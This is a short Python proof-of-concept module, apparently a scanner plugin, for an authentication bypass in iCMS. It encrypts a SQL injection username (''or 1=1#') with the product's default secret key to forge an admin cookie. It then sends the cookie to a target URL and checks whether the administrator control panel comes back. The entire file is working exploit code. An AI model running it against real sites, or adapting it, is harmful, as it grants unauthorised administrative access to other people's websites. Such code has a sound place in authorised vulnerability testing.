from urllib import urlencode

import requests

from lib.core.data import target
from plugin.algorithm.authcode import AuthCode


def poc():
    try:
        url = target.url

        # ICMS DEFAULT CONFIG
        iPHP_COOKIE_DOMAIN = ""
        iPHP_COOKIE_PATH = "/"
        iPHP_COOKIE_PRE = "iCMS"
        iPHP_COOKIE_TIME = "86400"
        iPHP_KEY = "DyrNAPuW7S3pW5zchg2YRPSRSx8n5KcEEm6gmEfmnwFtrgPGKLDE4mBszRHDZDqk"
        sep = '#=iCMS=#'
        AUTH = 'iCMS_AUTH'
        cookiename = iPHP_COOKIE_PRE + '_' + AUTH

        # Generate the evil cookie
        username = "'or 1=1#"
        password = "1"
        payload = username + sep + password
        evilcookie = AuthCode.encode(payload, iPHP_KEY)

        # Send the evil cookie
        adminpanel = "iCMS Administrator's Control Panel"
        cookie = {cookiename: evilcookie}
        print("[*] The evil cookie : {}".format(cookie))
        text = requests.get(url, cookies=cookie).text
        if adminpanel in text:
            print("[+] Confirm: The website( {} ) is vulnerable".format(
                target.url))

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
